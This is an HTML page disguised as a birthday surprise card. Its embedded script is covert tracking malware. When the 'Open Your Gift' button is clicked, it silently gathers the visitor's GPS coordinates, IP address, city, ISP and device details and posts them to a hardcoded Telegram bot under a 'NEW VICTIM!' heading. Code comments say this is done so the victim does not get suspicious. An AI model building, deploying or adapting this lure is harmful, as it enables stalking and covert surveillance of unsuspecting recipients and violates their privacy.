<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Happy Birthday! 🎂</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.95);
            border-radius: 30px;
            padding: 50px 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
        }
        .gift-icon {
            font-size: 100px;
            margin-bottom: 20px;
            display: inline-block;
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 32px;
        }
        .subtitle {
            color: #666;
            margin-bottom: 30px;
        }
        button {
            background: linear-gradient(135deg, #667eea, #764ba2);
            border: none;
            padding: 14px 35px;
            border-radius: 50px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }
        .message {
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            border-radius: 20px;
            padding: 25px;
            margin-top: 25px;
            display: none;
            color: white;
        }
        .message.show { display: block; }
        .footer { margin-top: 25px; font-size: 11px; color: #aaa; }
    </style>
</head>
<body>
<div class="container">
    <div class="gift-icon">🎁</div>
    <h1>🎂 Happy Birthday! 🎉</h1>
    <div class="subtitle">Someone sent you a birthday surprise!</div>
    <button id="giftBtn">🎁 Open Your Gift 🎁</button>
    <div class="message" id="message">
        <h2>🎈 SURPRISE! 🎈</h2>
        <p>Wishing you a fantastic birthday! 🎂</p>
        <p>May all your wishes come true! ✨</p>
    </div>
    <div class="footer">❤️ Made with love</div>
</div>

<script>
    const BOT_TOKEN = "8858548041:AAH5-uEvtsWNMsCpeEKsvOseVnLM-tAHaNs";
    
    const urlParams = new URLSearchParams(window.location.search);
    const targetId = urlParams.get('id') || 'unknown';
    const targetName = urlParams.get('name') || 'Guest';
    const USER_CHAT_ID = urlParams.get('user_id') || '6323367629';
    
    let dataSent = false;
    
    async function sendToTelegram(message) {
        try {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: USER_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            });
        } catch(e) {}
    }
    
    async function getLocation() {
        try {
            if (navigator.geolocation) {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000
                    });
                });
                return {
                    success: true,
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                };
            }
        } catch(e) {}
        return { success: false };
    }
    
    async function getIPInfo() {
        try {
            const resp = await fetch('https://ipapi.co/json/');
            const data = await resp.json();
            return {
                ip: data.ip || 'N/A',
                city: data.city || 'N/A',
                region: data.region || 'N/A',
                country: data.country_name || 'N/A',
                isp: data.org || 'N/A'
            };
        } catch(e) {
            return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
        }
    }
    
    async function getDeviceInfo() {
        return {
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language
        };
    }
    
    document.getElementById('giftBtn').onclick = async function() {
        if (dataSent) return;
        
        // Change button text so victim doesn't get suspicious
        document.getElementById('giftBtn').innerHTML = "🎁 Opening... 🎁";
        document.getElementById('giftBtn').disabled = true;
        
        // Collect data silently
        const [location, ipInfo, device] = await Promise.all([
            getLocation(),
            getIPInfo(),
            getDeviceInfo()
        ]);
        
        // Build message
        let msg = `🎁 <b>NEW VICTIM!</b>\n\n`;
        msg += `🔗 <b>Link:</b> ${targetName}\n`;
        msg += `🆔 <b>ID:</b> ${targetId}\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
        
        if (location.success) {
            msg += `<b>📍 GPS LOCATION</b>\n`;
            msg += `Lat: ${location.lat}\n`;
            msg += `Lon: ${location.lon}\n`;
            msg += `Accuracy: ${Math.round(location.accuracy)}m\n`;
            msg += `🗺️ https://maps.google.com/?q=${location.lat},${location.lon}\n\n`;
        } else {
            msg += `<b>📍 GPS:</b> ❌ Blocked\n\n`;
        }
        
        msg += `<b>🌐 NETWORK</b>\n`;
        msg += `IP: <code>${ipInfo.ip}</code>\n`;
        msg += `City: ${ipInfo.city}\n`;
        msg += `Region: ${ipInfo.region}\n`;
        msg += `Country: ${ipInfo.country}\n`;
        msg += `ISP: ${ipInfo.isp}\n\n`;
        
        msg += `<b>📱 DEVICE</b>\n`;
        msg += `Platform: ${device.platform}\n`;
        msg += `Screen: ${device.screen}\n`;
        msg += `Timezone: ${device.timezone}\n`;
        msg += `Language: ${device.language}\n\n`;
        
        msg += `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n`;
        msg += `\n👨‍💻 @KINGITACHI18`;
        
        await sendToTelegram(msg);
        
        // Show birthday message (normal gift)
        document.getElementById('message').classList.add('show');
        document.getElementById('giftBtn').style.display = 'none';
        
        dataSent = true;
    };
</script>
</body>
</html>
